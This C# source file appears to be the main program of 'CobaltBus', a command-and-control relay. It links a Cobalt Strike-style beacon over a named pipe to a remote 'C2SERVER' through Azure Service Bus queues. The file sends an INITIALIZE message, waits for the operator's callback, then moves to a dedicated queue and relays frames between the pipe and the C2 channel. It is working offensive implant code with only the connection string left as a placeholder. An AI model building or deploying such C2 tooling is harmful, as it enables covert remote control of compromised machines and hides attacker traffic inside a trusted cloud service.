using Beacon.Handlers;
using Beacon.Models;
using Microsoft.ServiceBus;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Beacon
{
    class Program
    {
        public static string baseQueueName = "CobaltBus-";
       
        public static string connectionString = "<change-me>";


        static async Task Main(string[] args)
        {
            ServiceBusEnvironment.SystemConnectivity.Mode = Microsoft.ServiceBus.ConnectivityMode.Https;

            var namePipeName = Guid.NewGuid().ToString();
            var beaconId = Guid.NewGuid().ToString();

            Console.WriteLine("[+] BeaconID " + beaconId);

            Console.WriteLine("[+] PipeName " + namePipeName);

            var namePipeHandler = new NamePipeHandler(namePipeName, beaconId);

            var serviceBusHandler = new ServiceBusHandler(connectionString, baseQueueName, beaconId, namePipeHandler);
            var interactive = true;

            //Start listening for Negotation messages on that OrchestrationQueue
            // We don't want to await this, since it needs to run async with other tasks
            var c2Id = "C2SERVER";

            var initMsg = new BeaconMsg()
            {
                To = c2Id,
                From = beaconId,
                Command = "INITIALIZE",
                Payload = namePipeName,
                Queue = baseQueueName

            };

            Console.WriteLine("[+] Sending INITIALIZE request");
            await serviceBusHandler.SendMessageAsync(baseQueueName, JsonConvert.SerializeObject(initMsg));


            Console.WriteLine("[+] Started response listener");
            serviceBusHandler.ReceiveMessagesAsync(baseQueueName);

            while (!serviceBusHandler.Initiliazed)
            {
                //Loop to wait for the beacon to recived it's first callback to do something
            }

            var newQueueName = serviceBusHandler.QueueName;
            //We got a callback to do something
            Console.WriteLine($"[+] Moving into a dedicated queue, starting {newQueueName}");

            var serviceBusHandlerTwo = new ServiceBusHandler(connectionString, newQueueName, beaconId, namePipeHandler);

            serviceBusHandlerTwo.ReceiveMessagesAsync(newQueueName);

            if (interactive)
            {
                while (true)
                {
                }
            }
            else
            {
                while (true)
                {
                    //RunningOtherCommand
                    if (namePipeHandler.Connected && !namePipeHandler.RunningOtherCommand)
                    {
                        var byteArray = Convert.FromBase64String("AA==");
                        namePipeHandler.SendFrame(byteArray);
                        var readBuffer = namePipeHandler.ReadFrame();

                    }
                    else
                    {
                        Console.WriteLine("[+] Command running, skipping fake");
                    }
                }
            }
        }
    }
}
